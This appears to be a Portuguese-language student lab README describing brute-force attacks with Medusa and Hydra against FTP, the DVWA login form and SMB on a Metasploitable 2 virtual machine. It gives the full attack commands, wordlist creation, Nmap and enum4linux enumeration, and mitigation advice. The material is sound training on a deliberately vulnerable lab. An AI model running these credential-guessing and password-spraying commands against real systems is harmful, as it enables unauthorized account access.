# 🔐Projeto -01 Desafio Prático: Ataques de Força Bruta com Medusa (FTP e DVWA)

Este projeto tem como objetivo simular ataques de força bruta utilizando Kali Linux e a ferramenta Medusa, explorando serviços vulneráveis em Metasploitable 2 e DVWA. A proposta é entender o funcionamento dos ataques, validar acessos e propor medidas de mitigação.

---

## 🛠️ 1. Configuração do Ambiente

### 🔧 VirtualBox

Crie duas máquinas virtuais:

- **Kali Linux**
  - 2 vCPU
  - 4GB RAM
  - Adaptador de rede: *Host-Only* (ex: `vboxnet0`)

- **Metasploitable 2**
  - 1–2 vCPU
  - 1GB RAM
  - Mesma rede *Host-Only*

### 🌐 Teste de conectividade

- **Na Metasploitable 2**, descubra o IP:
  ```bash
  ip a

Na Kali Linux, teste a conexão:

ping -c 3 192.168.56.102

🔍 2. Enumeração Inicial

Utilize o Nmap para identificar os serviços ativos na Metasploitable:

nmap -sV -p 21,22,80,445,139 192.168.56.102

Serviços de interesse:

FTP (porta 21)

HTTP (porta 80 → DVWA)

SMB (portas 139/445)

💥 3. Ataques com Medusa

📁 Criação de Wordlists simples

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

🔓 Ataque FTP

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6

Validação esperada:

ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]

🌐 Ataque DVWA (formulário web)

Acesse o DVWA:

http://192.168.56.102/dvwa

Login padrão:

Usuário: admin

Senha: password

Vá em DVWA Security → defina como Low

Identifique o caminho do formulário: /dvwa/login.php

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http_form \
-m FORM:login_form=Login \
-m DENY-SIGNAL="Login failed" \
-m USER="username" -m PASS="password" \
-m VERBOSE -m PATH="/dvwa/login.php"

⚠️ Se o módulo http_form não estiver disponível, considere usar Hydra como alternativa:

hydra -l admin -P pass.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

🧑‍💻 Ataque SMB com enumeração de usuários

Enumeração com enum4linux

enum4linux -U 192.168.56.102

Password spraying com Medusa

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M smbnt

📄 4. Documentação e Mitigação

✅ Validação de acessos

Capture evidências com:

gnome-screenshot

screencapture

printscreen

Registre acessos bem-sucedidos e falhas

🛡️ Recomendações de mitigação

Utilize senhas fortes e únicas

Implemente limite de tentativas (ex: fail2ban)

Monitore logs de autenticação

Desative serviços desnecessários

📚 Compartilhamento do Projeto

Sugestões para publicar no GitHub:

README explicativo (este arquivo)

Wordlists utilizadas (users.txt, pass.txt)

Prints dos testes

Reflexões sobre segurança ofensiva e defensiva

Realizado com 💖 por lorac-2. 